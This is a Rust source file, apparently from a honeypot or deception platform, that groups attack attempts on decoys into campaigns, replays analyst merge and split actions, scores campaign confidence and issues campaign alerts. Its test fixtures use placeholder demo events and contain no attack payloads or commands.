#[allow(clippy::too_many_arguments)]
fn registry_update(
    input: &Input<'_>,
    attempts: &[&Attempt],
    stored: &[Option<&str>],
    keys: &Keys,
    edges: &[Vec<(usize, usize)>],
    groups: &BTreeMap<String, Group>,
    cores: &BTreeMap<String, BTreeSet<usize>>,
    merges: &[MergeEvent<'_>],
) -> RegistryUpdate {
    let mut up = RegistryUpdate::default();
    let mut absorbed: BTreeMap<&str, &str> = BTreeMap::new();
    for (id, g) in groups {
        let established = |m: usize| {
            edges[m]
                .iter()
                .any(|&(k, o)| keys.info[k].strength != Strength::Weak && g.members.contains(&o))
        };
        let mut kept: Vec<usize> = Vec::new();
        for &m in &g.members {
            let same = stored[m] == Some(id.as_str());
            let strong = established(m);
            if strong && !same {
                let a = attempts[m];
                up.members.push(MemberRecord {
                    attempt_id: a.attempt_id.clone(),
                    campaign_id: id.clone(),
                    attempt_first_seen: a.first_seen,
                });
            }
            if strong || same {
                kept.push(m);
            }
        }
        if let Some(core) = cores.get(id) {
            for &m in core {
                if let Some(s) = stored[m]
                    && s != id
                    && !groups.contains_key(s)
                {
                    absorbed.entry(s).or_insert(id.as_str());
                }
            }
        }
        let first = kept.iter().map(|&m| attempts[m].first_seen).min();
        let last = kept.iter().map(|&m| attempts[m].last_seen).max();
        let (Some(first), Some(last)) = (first, last) else {
            continue;
        };
        let rec = match input.registry.campaigns.get(id) {
            Some(s) => StoredCampaign {
                first_seen: s.first_seen.min(first),
                last_seen: s.last_seen.max(last),
                ..s.clone()
            },
            None => StoredCampaign {
                campaign_id: id.clone(),
                created_at: input.now,
                first_seen: first,
                last_seen: last,
                merged_into: None,
                attempts: 0,
            },
        };
        if input.registry.campaigns.get(id) != Some(&rec) {
            up.campaigns.push(rec);
        }
    }
    for (from, into) in absorbed {
        let older = |a: &str, b: &str| {
            let r = |id: &str| {
                (
                    input
                        .registry
                        .campaigns
                        .get(id)
                        .map_or(i64::MAX, |c| c.created_at),
                    id.to_string(),
                )
            };
            r(a) < r(b)
        };
        if let Some(s) = input.registry.campaigns.get(from)
            && s.merged_into.is_none()
            && from != into
            && older(into, from)
        {
            up.campaigns.push(StoredCampaign {
                merged_into: Some(into.to_string()),
                ..s.clone()
            });
        }
    }
    // Provenance for every merge this update makes permanent: a pass-1
    // merge inside one campaign with an attempt not yet recorded there.
    let mut per_campaign: BTreeMap<&str, usize> = BTreeMap::new();
    let mut seen: BTreeSet<(usize, usize, usize)> = BTreeSet::new();
    let group_of: BTreeMap<usize, &String> = groups
        .iter()
        .flat_map(|(id, g)| g.members.iter().map(move |&m| (m, id)))
        .collect();
    for e in merges {
        let (Some(&id), Some(&other_id)) = (group_of.get(&e.p), group_of.get(&e.c)) else {
            continue;
        };
        if id != other_id {
            continue;
        }
        let new = stored[e.p] != Some(id.as_str()) || stored[e.c] != Some(id.as_str());
        if !new || !seen.insert((e.key, e.p, e.c)) {
            continue;
        }
        let n = per_campaign.entry(id.as_str()).or_default();
        if *n >= MAX_BRIDGE_RECORDS {
            continue;
        }
        *n += 1;
        // The side not carrying this campaign's id is the one merged in.
        let other = |set: &BTreeSet<&str>| -> Option<String> {
            if set.contains(id.as_str()) {
                return None;
            }
            set.iter()
                .map(|s| input.registry.resolve(s))
                .find(|s| *s != id)
                .map(str::to_string)
        };
        let (attempt, with, merged, sides) = match (other(&e.stored.0), other(&e.stored.1)) {
            (None, Some(m)) => (e.p, e.c, Some(m), e.sides),
            (Some(m), _) => (e.c, e.p, Some(m), (e.sides.1, e.sides.0)),
            (None, None) => (e.p, e.c, None, e.sides),
        };
        up.bridges.push(BridgeRecord {
            campaign_id: id.clone(),
            merged_campaign_id: merged,
            attempt_id: attempts[attempt].attempt_id.clone(),
            with_attempt_id: attempts[with].attempt_id.clone(),
            signal_id: keys.keys[e.key].signal_id(),
            feature: keys.keys[e.key].feature,
            attempt_side: u32::try_from(sides.0).unwrap_or(u32::MAX),
            with_side: u32::try_from(sides.1).unwrap_or(u32::MAX),
            small_halves: sides.0.min(sides.1) < BRIDGE_MIN_ATTEMPTS,
            recorded_at: input.now,
        });
    }
    up
}

fn apply_actions(
    input: &Input<'_>,
    idx_of: &BTreeMap<&str, usize>,
    edges: &[Vec<(usize, usize)>],
    groups: &mut BTreeMap<String, Group>,
    member_of: &mut [Option<String>],
    notes: &mut Vec<String>,
) {
    let mut actions: Vec<&CampaignAction> = input.actions.iter().collect();
    actions.sort_by(|a, b| (a.at, &a.action_id).cmp(&(b.at, &b.action_id)));
    // Structural actions always replay; only the oldest feedback is shed.
    let feedback = actions.iter().filter(|a| !a.is_structural()).count();
    let mut shed = feedback.saturating_sub(MAX_FEEDBACK_ACTIONS);
    if shed > 0 {
        notes.push(format!(
            "{shed} older feedback action(s) were not replayed: at most \
             {MAX_FEEDBACK_ACTIONS} are."
        ));
    }
    actions.retain(|a| {
        if !a.is_structural() && shed > 0 {
            shed -= 1;
            return false;
        }
        true
    });
    // By campaign id (following registry merges), else by anchor attempt.
    let resolve = |groups: &BTreeMap<String, Group>,
                   member_of: &[Option<String>],
                   id: &str,
                   anchors: &[String]|
     -> Option<String> {
        let id = input.registry.resolve(id);
        if groups.get(id).is_some_and(|g| !g.members.is_empty()) {
            return Some(id.to_string());
        }
        anchors
            .iter()
            .find_map(|a| idx_of.get(a.as_str()).and_then(|&i| member_of[i].clone()))
    };
    for a in actions {
        // A campaign with nothing in this window is normal as the window
        // moves; its actions apply again when it is back.
        let Some(gid) = resolve(groups, member_of, &a.campaign_id, &a.anchor_attempt_ids) else {
            continue;
        };
        let by = AddedBy {
            action_id: a.action_id.clone(),
            kind: a.kind,
            analyst_id: a.analyst_id.clone(),
            at: a.at,
        };
        match a.kind {
            ActionKind::Label => {
                let g = groups.get_mut(&gid).expect("group exists");
                if let Some(t) = a.title.as_deref().map(str::trim).filter(|t| !t.is_empty()) {
                    let t: String = t.chars().take(MAX_TITLE_CHARS).collect();
                    g.analyst.title = Some(printable(&t));
                }
            }
            ActionKind::Status => {
                groups.get_mut(&gid).expect("group exists").analyst.status = a.status;
            }
            ActionKind::Feedback => {
                if let Some(f) = a.feedback {
                    groups.get_mut(&gid).expect("group exists").analyst.feedback = Some(Override {
                        feedback: f,
                        analyst_id: a.analyst_id.clone(),
                        at: a.at,
                        note: a.note.clone(),
                    });
                }
            }
            ActionKind::Merge => {
                for r in a.merge.iter().take(MAX_ACTION_CAMPAIGNS) {
                    let Some(other) =
                        resolve(groups, member_of, &r.campaign_id, &r.anchor_attempt_ids)
                    else {
                        continue;
                    };
                    if other == gid {
                        // Already together (a live bridge joined them, or
                        // only its anchors are left in the window); still
                        // say where the campaign came from.
                        let g = groups.get_mut(&gid).expect("group exists");
                        if r.campaign_id != gid && !g.analyst.merged_from.contains(&r.campaign_id) {
                            g.analyst.merged_from.push(r.campaign_id.clone());
                        }
                        continue;
                    }
                    let o = groups.remove(&other).expect("group exists");
                    let g = groups.get_mut(&gid).expect("group exists");
                    for &m in &o.members {
                        member_of[m] = Some(gid.clone());
                        g.members.insert(m);
                        g.added_by.insert(m, by.clone());
                    }
                    g.seed = g.seed.min(o.seed);
                    g.possible_links.extend(o.possible_links);
                    g.analyst.merged_from.push(other);
                    g.analyst.merged_from.extend(o.analyst.merged_from);
                }
            }
            ActionKind::Split => {
                let new_id = split_campaign_id(input.tenant_id, &a.action_id);
                let g = groups.get(&gid).expect("group exists");
                let moving: BTreeSet<usize> = a
                    .attempt_ids
                    .iter()
                    .take(MAX_ACTION_ATTEMPTS)
                    .filter_map(|id| idx_of.get(id.as_str()).copied())
                    .filter(|i| g.members.contains(i))
                    .collect();
                // Already split (the window only holds the split side), or
                // none of the named attempts are here.
                if gid != new_id && !moving.is_empty() {
                    split(&gid, new_id, &moving, &by, edges, groups, member_of);
                }
            }
        }
        if let Some(g) = groups.get_mut(&gid) {
            g.analyst.action_ids.push(a.action_id.clone());
        }
    }
}

/// Move `moving` out of group `gid` into `new_id`. The named attempts move;
/// the rest keep the campaign id, so the split holds however the window
/// moves.
fn split(
    gid: &str,
    new_id: String,
    moving: &BTreeSet<usize>,
    by: &AddedBy,
    edges: &[Vec<(usize, usize)>],
    groups: &mut BTreeMap<String, Group>,
    member_of: &mut [Option<String>],
) {
    let g = groups.get_mut(gid).expect("group exists");
    for &m in moving {
        g.members.remove(&m);
        g.added_by.remove(&m);
        member_of[m] = Some(new_id.clone());
    }
    if let Some(&first) = g.members.iter().next() {
        g.seed = first;
    }
    // Members left with no join inside their side stay by the analyst's
    // decision, so say so.
    let orphaned =
        |members: &BTreeSet<usize>, m: usize| !edges[m].iter().any(|(_, o)| members.contains(o));
    let keep_orphans: Vec<usize> = g
        .members
        .iter()
        .copied()
        .filter(|&m| orphaned(&g.members, m))
        .collect();
    for m in keep_orphans {
        g.added_by.entry(m).or_insert_with(|| by.clone());
    }
    let added: BTreeMap<usize, AddedBy> = moving.iter().map(|&m| (m, by.clone())).collect();
    let seed = *moving.iter().next().expect("non-empty");
    let target = groups.entry(new_id).or_insert_with(|| Group {
        possible_links: Vec::new(),
        seed,
        members: BTreeSet::new(),
        added_by: BTreeMap::new(),
        analyst: AnalystState {
            split_from: Some(gid.to_string()),
            ..AnalystState::default()
        },
    });
    target.seed = target.seed.min(seed);
    target.members.extend(moving.iter().copied());
    target.added_by.extend(added);
}

struct BuildCtx<'a, 'b> {
    input: &'a Input<'b>,
    params: Params,
    cfg: &'a ConfidenceConfig,
    attempts: &'a [&'a Attempt],
    keys_of: &'a [Vec<usize>],
    edges: &'a [Vec<(usize, usize)>],
    keys: &'a Keys,
    refs: &'a BTreeMap<&'a str, &'a [String]>,
    decoys_by_product: &'a BTreeMap<&'a str, BTreeSet<&'a str>>,
    capped: &'a BTreeMap<usize, usize>,
    bridges: &'a [BridgeRecord],
}

fn counted(values: impl IntoIterator<Item = String>) -> Counted {
    let all: BTreeSet<String> = values.into_iter().collect();
    Counted {
        count: u32::try_from(all.len()).unwrap_or(u32::MAX),
        values: all.into_iter().take(MAX_SUMMARY_VALUES).collect(),
    }
}

fn u32_len(n: usize) -> u32 {
    u32::try_from(n).unwrap_or(u32::MAX)
}

/// No clustering evidence stronger than weak.
fn weak_only(evidence: &[Evidence]) -> bool {
    !evidence
        .iter()
        .any(|e| e.source == EvidenceSource::CampaignCluster && e.weight > Strength::Weak.weight())
}

/// A campaign or membership held together only by weak features stays
/// below `medium` until an analyst confirms it (#33 validation: a shared
/// ASN and generic probes are low and emerging at most).
fn cap_weak_only(cfg: &ConfidenceConfig, mut l: ConfidenceLink) -> ConfidenceLink {
    let confirmed = matches!(
        l.r#override.as_ref().map(|o| o.feedback),
        Some(Feedback::TruePositive)
    );
    let t = cfg.thresholds;
    if confirmed || !weak_only(&l.evidence) || l.score < t.medium {
        return l;
    }
    l.score = t.medium.saturating_sub(1);
    l.band = Band::Low;
    l.caps_applied
        .push("weak features only: capped below medium".into());
    l.publishable = false;
    l.auto_state_promote = false;
    l.ui_highlight = l.score >= t.ui_highlight_min;
    l.radar_queue = l.score >= t.radar_queue_min;
    l
}

fn build_campaign(ctx: &BuildCtx<'_, '_>, campaign_id: String, g: Group) -> Campaign {
    let atts = ctx.attempts;
    let keys = ctx.keys;
    let members_idx: Vec<usize> = g.members.iter().copied().collect();

    // Joins per member, inside the campaign only, strongest first.
    let mut members = Vec::with_capacity(members_idx.len());
    let mut carried_over = 0usize;
    for &m in &members_idx {
        let mut seen: BTreeSet<usize> = BTreeSet::new();
        let mut joins: Vec<(usize, usize)> = Vec::new();
        for &(k, o) in &ctx.edges[m] {
            if g.members.contains(&o) && seen.insert(k) {
                joins.push((k, o));
            }
        }
        joins.sort_by(|x, y| keys.order(x.0, y.0));
        let added_by = g.added_by.get(&m).cloned();
        let carried = joins.is_empty() && added_by.is_none();
        carried_over += usize::from(carried);
        let a = atts[m];
        members.push(Member {
            attempt_id: a.attempt_id.clone(),
            decoy_id: a.decoy_id.clone(),
            catalogue_id: a.catalogue_id.clone(),
            sensor_id: a.sensor_id.clone(),
            src: a.src.clone(),
            first_seen: a.first_seen,
            last_seen: a.last_seen,
            state: a.state,
            noise_score: a.noise.as_ref().map(|n| n.score),
            joined_by: joins
                .into_iter()
                .take(MAX_JOINS_PER_MEMBER)
                .map(|(k, o)| join(ctx, k, atts[o]))
                .collect(),
            added_by,
            carried_over: carried,
        });
    }

    // Keys shared inside the campaign, with how many members share each.
    let mut shared: BTreeMap<usize, usize> = BTreeMap::new();
    for &m in &members_idx {
        let mine: BTreeSet<usize> = ctx.edges[m]
            .iter()
            .filter(|(_, o)| g.members.contains(o))
            .map(|&(k, _)| k)
            .collect();
        for k in mine {
            *shared.entry(k).or_default() += 1;
        }
    }
    // Values of every key held by two or more members, for the summary.
    let mut held: BTreeMap<usize, usize> = BTreeMap::new();
    for &m in &members_idx {
        for &k in &ctx.keys_of[m] {
            *held.entry(k).or_default() += 1;
        }
    }
    let shared_values = |f: Feature| {
        counted(
            held.iter()
                .filter(|&(&k, &n)| keys.keys[k].feature == f && n >= 2)
                .map(|(&k, _)| keys.info[k].display.clone()),
        )
    };

    let mut cves: BTreeSet<String> = BTreeSet::new();
    let mut cve_first: BTreeMap<String, i64> = BTreeMap::new();
    let mut techniques: BTreeSet<String> = BTreeSet::new();
    for &m in &members_idx {
        let a = atts[m];
        let mut mine: BTreeSet<String> = a
            .hook_hits
            .iter()
            .filter_map(|h| h.cve_id.as_deref())
            .map(str::to_ascii_uppercase)
            .collect();
        if let Some(s) = ctx.input.signals.get(&a.attempt_id) {
            mine.extend(s.cves.iter().map(|c| c.to_ascii_uppercase()));
            techniques.extend(s.techniques.iter().map(|t| printable(t)));
        }
        for c in mine {
            let e = cve_first.entry(c.clone()).or_insert(a.first_seen);
            *e = (*e).min(a.first_seen);
            cves.insert(c);
        }
    }

    let infrastructure = InfrastructureSummary {
        src_ips: counted(members_idx.iter().map(|&m| ip_display(&atts[m].src))),
        asns: members_idx
            .iter()
            .filter_map(|&m| ctx.input.asns.get(&atts[m].src).copied())
            .collect::<BTreeSet<u32>>()
            .into_iter()
            .collect(),
        stage2_urls: shared_values(Feature::Stage2Url),
        callback_domains: shared_values(Feature::CallbackDomain),
        callback_ips: shared_values(Feature::CallbackIp),
    };
    let ttp = TtpSummary {
        techniques: techniques.into_iter().collect(),
        behaviour_fingerprints: shared_values(Feature::BehaviourFingerprint),
        cmdlines: shared_values(Feature::Cmdline),
    };
    let payload = PayloadSummary {
        payload_sha256: shared_values(Feature::PayloadSha256),
        file_sha256: shared_values(Feature::FileSha256),
        request_substrings: shared_values(Feature::RequestSubstring),
        request_shapes: shared_values(Feature::RequestShape),
    };
    let targeting = targeting(ctx, &members_idx, &cves, &cve_first);

    // Confidence: one clustering item per shared key, strongest and most
    // shared first, plus carried-over members and the lowest member noise
    // score.
    let mut ranked: Vec<(usize, usize)> = shared.into_iter().collect();
    ranked.sort_by(|a, b| {
        (keys.info[a.0].strength, std::cmp::Reverse(a.1))
            .cmp(&(keys.info[b.0].strength, std::cmp::Reverse(b.1)))
            .then_with(|| keys.order(a.0, b.0))
    });
    let mut evidence: Vec<Evidence> = ranked
        .iter()
        .take(MAX_CONFIDENCE_ITEMS)
        .map(|&(k, count)| {
            let i = &keys.info[k];
            Evidence {
                signal_id: keys.keys[k].signal_id(),
                source: EvidenceSource::CampaignCluster,
                weight: i.strength.weight(),
                summary: format!(
                    "{count} attempts share {} {}",
                    keys.keys[k].feature.label(),
                    i.display
                ),
                reference: i.ioc_id.clone(),
            }
        })
        .collect();
    if carried_over > 0 {
        evidence.push(Evidence {
            signal_id: format!("campaign:registry:{campaign_id}"),
            source: EvidenceSource::CampaignCluster,
            weight: Strength::Weak.weight(),
            summary: format!(
                "{carried_over} attempts are members from an earlier window; what joined them \
                 is outside this one"
            ),
            reference: None,
        });
    }
    let analyst_added = g.added_by.len();
    if analyst_added > 0 {
        evidence.push(Evidence {
            signal_id: format!("campaign:analyst:{campaign_id}"),
            source: EvidenceSource::Analyst,
            weight: 0,
            summary: format!("{analyst_added} attempts are members by analyst merge or split"),
            reference: None,
        });
    }
    if let Some(low) = members_idx
        .iter()
        .filter_map(|&m| atts[m].noise.as_ref().map(|n| n.score))
        .min()
    {
        evidence.push(Evidence {
            signal_id: format!("campaign:noise:{campaign_id}"),
            source: EvidenceSource::NoiseScore,
            weight: low,
            summary: format!("lowest member source noise score {low}"),
            reference: None,
        });
    }
    let weak = weak_only(&evidence);
    let link = score(
        ctx.cfg,
        LinkKind::AttemptCampaign,
        &atts[g.seed].attempt_id,
        &campaign_id,
        evidence,
        g.analyst.feedback.clone(),
    )
    .map(|l| cap_weak_only(ctx.cfg, l));
    let confidence = match link {
        Some(l) => CampaignConfidence {
            score: l.score,
            band: l.band,
            wording: l.wording,
            publishable: l.publishable,
            evidence: l.evidence,
            caps_applied: l.caps_applied,
        },
        // Unreachable in practice: every campaign has a join or an action.
        None => CampaignConfidence {
            score: 0,
            band: Band::Low,
            wording: "possible".into(),
            publishable: false,
            evidence: vec![],
            caps_applied: vec![],
        },
    };

    let first_seen = members_idx
        .iter()
        .map(|&m| atts[m].first_seen)
        .min()
        .unwrap_or(0);
    let last_seen = members_idx
        .iter()
        .map(|&m| atts[m].last_seen)
        .max()
        .unwrap_or(0);
    let confirmed = confidence.wording == "confirmed";
    let status = match g.analyst.status {
        Some(s) => s,
        None if ctx.input.now - last_seen > ctx.params.closed_after_ms => CampaignStatus::Closed,
        None if confidence.band == Band::Low || members_idx.len() < 3 || (weak && !confirmed) => {
            CampaignStatus::Emerging
        }
        None => CampaignStatus::Active,
    };
    let title = g.analyst.title.clone().unwrap_or_else(|| {
        let decoys = targeting.decoys_touched;
        match ranked.first() {
            Some(&(k, _)) => {
                let display = keys.info[k].display.as_str();
                let short: String = display.chars().take(TITLE_VALUE_CHARS).collect();
                let more = if display.chars().count() > TITLE_VALUE_CHARS {
                    "..."
                } else {
                    ""
                };
                let label = keys.keys[k].feature.label();
                let mut c = label.chars();
                let label = c
                    .next()
                    .map(|f| f.to_uppercase().chain(c).collect::<String>())
                    .unwrap_or_default();
                format!("{label} {short}{more} on {decoys} decoys")
            }
            None => format!(
                "{} attempts carried over or grouped by an analyst",
                members_idx.len()
            ),
        }
    });

    let seed_features: Vec<Feature> = ctx.edges[g.seed]
        .iter()
        .filter(|(_, o)| g.members.contains(o))
        .map(|&(k, _)| keys.keys[k].feature)
        .collect::<BTreeSet<_>>()
        .into_iter()
        .collect();

    let mut ioc_counts: BTreeMap<&str, usize> = BTreeMap::new();
    for &m in &members_idx {
        let mine: BTreeSet<&str> = ctx
            .refs
            .get(atts[m].attempt_id.as_str())
            .map(|r| r.iter().map(String::as_str).collect())
            .unwrap_or_default();
        for id in mine {
            *ioc_counts.entry(id).or_default() += 1;
        }
    }
    let shared_ioc_ids: Vec<String> = ioc_counts
        .into_iter()
        .filter(|(_, n)| *n >= 2)
        .take(MAX_SHARED_IOCS)
        .map(|(id, _)| id.to_string())
        .collect();

    let mut notes = Vec::new();
    let cut = members_idx
        .iter()
        .filter(|m| ctx.capped.contains_key(m))
        .count();
    if cut > 0 {
        notes.push(format!(
            "{cut} member attempt(s) shared more features than the cap; the commonest were not \
             used."
        ));
    }

    let set = |f: &dyn Fn(&Attempt) -> Option<String>| -> Vec<String> {
        members_idx
            .iter()
            .filter_map(|&m| f(atts[m]))
            .collect::<BTreeSet<_>>()
            .into_iter()
            .collect()
    };
    Campaign {
        confidence_ref: format!("/v0/campaigns/{campaign_id}/evidence"),
        tenant_id: ctx.input.tenant_id.to_string(),
        tenant_scope: TenantScope::Tenant,
        title,
        status,
        first_seen,
        last_seen,
        seed: Seed {
            attempt_id: atts[g.seed].attempt_id.clone(),
            features: seed_features,
        },
        attempt_ids: members_idx
            .iter()
            .map(|&m| atts[m].attempt_id.clone())
            .collect(),
        decoy_ids: set(&|a| Some(a.decoy_id.clone())),
        sensor_ids: set(&|a| a.sensor_id.clone()),
        catalogue_ids: set(&|a| Some(a.catalogue_id.clone())),
        members,
        feature_summary: FeatureSummary {
            infrastructure,
            ttp,
            targeting,
            payload,
        },
        shared_ioc_ids,
        confidence,
        suggested_actor_links: vec![],
        analyst: g.analyst,
        possible_links: g.possible_links,
        bridges: ctx
            .bridges
            .iter()
            .filter(|b| b.campaign_id == campaign_id)
            .cloned()
            .collect(),
        notes,
        campaign_id,
    }
}

fn join(ctx: &BuildCtx<'_, '_>, k: usize, with: &Attempt) -> Join {
    let key = &ctx.keys.keys[k];
    let i = &ctx.keys.info[k];
    Join {
        signal_id: key.signal_id(),
        feature: key.feature,
        families: key.feature.families().to_vec(),
        strength: i.strength,
        weight: i.strength.weight(),
        display: i.display.clone(),
        with_attempt_id: with.attempt_id.clone(),
        ioc_id: i.ioc_id.clone(),
    }
}

fn targeting(
    ctx: &BuildCtx<'_, '_>,
    members: &[usize],
    cves: &BTreeSet<String>,
    cve_first: &BTreeMap<String, i64>,
) -> Targeting {
    let atts = ctx.attempts;
    let decoys: BTreeSet<&str> = members.iter().map(|&m| atts[m].decoy_id.as_str()).collect();
    let products: BTreeSet<&str> = members
        .iter()
        .map(|&m| atts[m].catalogue_id.as_str())
        .collect();
    let sensors: BTreeSet<&str> = members
        .iter()
        .filter_map(|&m| atts[m].sensor_id.as_deref())
        .collect();
    let sources: BTreeSet<&str> = members.iter().map(|&m| atts[m].src.as_str()).collect();
    let visible: BTreeSet<&str> = products
        .iter()
        .filter_map(|p| ctx.decoys_by_product.get(p))
        .flatten()
        .copied()
        .collect();
    let visible_n = visible.len().max(decoys.len()).max(1);
    let coverage = u8::try_from(decoys.len() * 100 / visible_n).unwrap_or(100);
    let mut bands = NoiseBands::default();
    for &m in members {
        match atts[m].noise.as_ref().map(|n| n.band) {
            Some(NoiseBand::Targeted) => bands.targeted += 1,
            Some(NoiseBand::Mixed) => bands.mixed += 1,
            Some(NoiseBand::Mass) => bands.mass += 1,
            None => bands.unknown += 1,
        }
    }
    let mut evidence = vec![format!(
        "touched {} of {} visible decoy(s) running the same products ({coverage}%)",
        decoys.len(),
        visible_n
    )];
    let mass_majority = bands.mass as usize * 2 > members.len();
    if bands.mass > 0 {
        evidence.push(format!(
            "{} of {} member attempt(s) come from sources that score as mass scanning",
            bands.mass,
            members.len()
        ));
    }
    let pattern = if (coverage >= 60 && decoys.len() >= 3) || mass_majority {
        TargetingPattern::Mass
    } else if visible_n >= 3 && coverage <= 34 && bands.mass == 0 {
        evidence.push("left most visible decoys of the same products alone".into());
        TargetingPattern::Selective
    } else {
        TargetingPattern::Mixed
    };
    let mut advisory_timing = Vec::new();
    for c in cves {
        let (Some(&published_at), Some(&first_seen)) =
            (ctx.input.advisories.get(c), cve_first.get(c))
        else {
            continue;
        };
        let offset_hours = (first_seen - published_at).div_euclid(HOUR_MS);
        let before = first_seen < published_at;
        evidence.push(if before {
            format!(
                "first attempt on {} came {} hour(s) before its advisory",
                printable(c),
                -offset_hours
            )
        } else {
            format!(
                "first attempt on {} came {offset_hours} hour(s) after its advisory",
                printable(c)
            )
        });
        advisory_timing.push(AdvisoryTiming {
            cve_id: printable(c),
            published_at,
            first_seen,
            offset_hours,
            before_disclosure: before,
        });
    }
    Targeting {
        pattern,
        attempts: u32_len(members.len()),
        sources: u32_len(sources.len()),
        decoys_touched: u32_len(decoys.len()),
        sensors_touched: u32_len(sensors.len()),
        products_touched: u32_len(products.len()),
        visible_decoys: u32_len(visible_n),
        coverage_pct: coverage,
        noise_bands: bands,
        catalogue_ids: products.iter().map(|p| p.to_string()).collect(),
        cves: cves.iter().map(|c| printable(c)).collect(),
        advisory_timing,
        evidence,
    }
}

// ---------------------------------------------------------------------------
// Read model glue, confidence links and alerts
// ---------------------------------------------------------------------------

/// Fill `campaign_id` on attempts and `campaign_ids` on IOCs from a
/// clustering over the same window.
pub fn attach(attempts: &mut [Attempt], iocs: &mut Extraction, clustering: &Clustering) {
    let by_attempt = clustering.membership();
    for a in attempts.iter_mut() {
        a.campaign_id = by_attempt.get(a.attempt_id.as_str()).map(|c| c.to_string());
    }
    for i in iocs.iocs.iter_mut() {
        let ids: BTreeSet<String> = i
            .attempt_ids
            .iter()
            .filter_map(|a| by_attempt.get(a.as_str()).map(|c| c.to_string()))
            .collect();
        i.campaign_ids = ids.into_iter().collect();
    }
}

/// The full #27 link for the campaign as a whole (attempt: the seed).
pub fn campaign_link(cfg: &ConfidenceConfig, c: &Campaign) -> Option<ConfidenceLink> {
    score(
        cfg,
        LinkKind::AttemptCampaign,
        &c.seed.attempt_id,
        &c.campaign_id,
        c.confidence.evidence.clone(),
        c.analyst.feedback.clone(),
    )
    .map(|l| cap_weak_only(cfg, l))
}

/// One `attempt_campaign` link per member: the features that joined it,
/// its own noise score, and an analyst confirmation when an action put it
/// there.
pub fn member_links(cfg: &ConfidenceConfig, c: &Campaign) -> Vec<ConfidenceLink> {
    c.members
        .iter()
        .filter_map(|m| {
            let mut evidence: Vec<Evidence> = m
                .joined_by
                .iter()
                .map(|j| Evidence {
                    signal_id: j.signal_id.clone(),
                    source: EvidenceSource::CampaignCluster,
                    weight: j.weight,
                    summary: format!(
                        "shares {} {} with {}",
                        j.feature.label(),
                        j.display,
                        j.with_attempt_id
                    ),
                    reference: Some(j.with_attempt_id.clone()),
                })
                .collect();
            let analyst = m.added_by.as_ref().map(|b| {
                evidence.push(Evidence {
                    signal_id: format!("campaign:analyst:{}", b.action_id),
                    source: EvidenceSource::Analyst,
                    weight: 0,
                    summary: format!("added by analyst {} action", b.kind.as_str()),
                    reference: Some(b.action_id.clone()),
                });
                Override {
                    feedback: Feedback::TruePositive,
                    analyst_id: b.analyst_id.clone(),
                    at: b.at,
                    note: format!("{} action {}", b.kind.as_str(), b.action_id),
                }
            });
            if m.carried_over {
                evidence.push(Evidence {
                    signal_id: format!("campaign:registry:{}", m.attempt_id),
                    source: EvidenceSource::CampaignCluster,
                    weight: Strength::Weak.weight(),
                    summary: "member from an earlier window; what joined it is outside this one"
                        .into(),
                    reference: None,
                });
            }
            if let Some(n) = m.noise_score {
                evidence.push(Evidence {
                    signal_id: format!("noise:{}", m.src),
                    source: EvidenceSource::NoiseScore,
                    weight: n,
                    summary: format!("source noise score {n}"),
                    reference: None,
                });
            }
            score(
                cfg,
                LinkKind::AttemptCampaign,
                &m.attempt_id,
                &c.campaign_id,
                evidence,
                analyst,
            )
            .map(|l| cap_weak_only(cfg, l))
        })
        .collect()
}

/// `campaign_updated` alerts (#15) for campaigns that are new or grew since
/// `previous` (campaign id to member count, as the producer last saw it).
/// Closed campaigns raise nothing. Emerging campaigns raise `low` so they
/// land in the review queue rather than paging.
pub fn alerts(previous: &BTreeMap<String, usize>, current: &[Campaign]) -> Vec<Alert> {
    let mut out = Vec::new();
    for c in current {
        if c.status == CampaignStatus::Closed {
            continue;
        }
        let n = c.attempt_ids.len();
        let t = &c.feature_summary.targeting;
        let what = match previous.get(&c.campaign_id) {
            None => format!("New {} campaign {}", c.status.as_str(), c.campaign_id),
            Some(&before) if n > before => {
                format!("Campaign {} grew from {before}", c.campaign_id)
            }
            Some(_) => continue,
        };
        let severity = if c.status == CampaignStatus::Emerging {
            Severity::Low
        } else {
            AlertType::CampaignUpdated.default_severity()
        };
        out.push(Alert {
            alert_id: Alert::make_id(
                AlertType::CampaignUpdated,
                &[&c.tenant_id, &c.campaign_id, &n.to_string()],
            ),
            ts: c.last_seen,
            severity,
            alert_type: AlertType::CampaignUpdated,
            decoy_id: None,
            attempt_id: None,
            campaign_id: Some(c.campaign_id.clone()),
            summary: format!(
                "{what} to {n} attempts from {} sources across {} decoys ({} campaign, \
                 confidence {}): {}",
                t.sources, t.decoys_touched, c.confidence.wording, c.confidence.score, c.title
            ),
            links: vec![Link {
                kind: AlertLinkKind::Campaign,
                href: format!("/campaigns/{}", c.campaign_id),
            }],
            src_ip: None,
            cve_id: None,
            subject: None,
        });
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::attempt::{DEFAULT_IDLE_GAP_MS, ExtraSignals, build};
    use crate::ioc::{ExtractOptions, extract};
    use serde_json::{Value, json};

    const T0: i64 = 1_792_285_323_000;
    const HASH: &str = "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae";

    fn app(id: &str, ts: i64, decoy: &str, src: &str, data: Value) -> Value {
        json!({
            "event_id": id, "ts": ts, "decoy_id": decoy, "catalogue_id": "foiled/demo-app/1.0.0",
            "decoy_kind": "sandbox", "channel": "application", "severity": "info",
            "src": {"ip": src}, "tenant_id": "t1",
            "source": {"kind": "sensor", "id": format!("sensor-{decoy}")}, "data": data
        })
    }

    fn hook(id: &str, ts: i64, decoy: &str, src: &str) -> Value {
        let mut v = app(id, ts, decoy, src, json!({}));
        v["channel"] = json!("hook");
        v["hook"] = json!({"hook_id": "demo-app.upload-path-traversal",
            "catalogue_id": "foiled/demo-app/1.0.0", "cve_id": "FOILED-DEMO-0001",
            "stage": "trigger", "sequence_no": 1, "t_offset_ms": 0});
        v
    }

    fn post(id: &str, ts: i64, decoy: &str, src: &str, hash: &str) -> Value {
        post_to(id, ts, decoy, src, hash, "/api/upload")
    }

    fn post_to(id: &str, ts: i64, decoy: &str, src: &str, hash: &str, path: &str) -> Value {
        app(
            id,
            ts,
            decoy,
            src,
            json!({"method": "POST", "path": path, "body_sha256": hash}),
        )
    }

    struct Run {
        attempts: Vec<Attempt>,
        x: Extraction,
        signals: BTreeMap<String, AttemptSignals>,
        asns: BTreeMap<String, u32>,
        registry: Registry,
    }

    fn prepare(vs: Vec<Value>) -> Run {
        let events: Vec<CaptureEvent> = vs
            .into_iter()
            .map(|v| serde_json::from_value(v).unwrap())
            .collect();
        let attempts = build(&events, DEFAULT_IDLE_GAP_MS, &ExtraSignals::new());
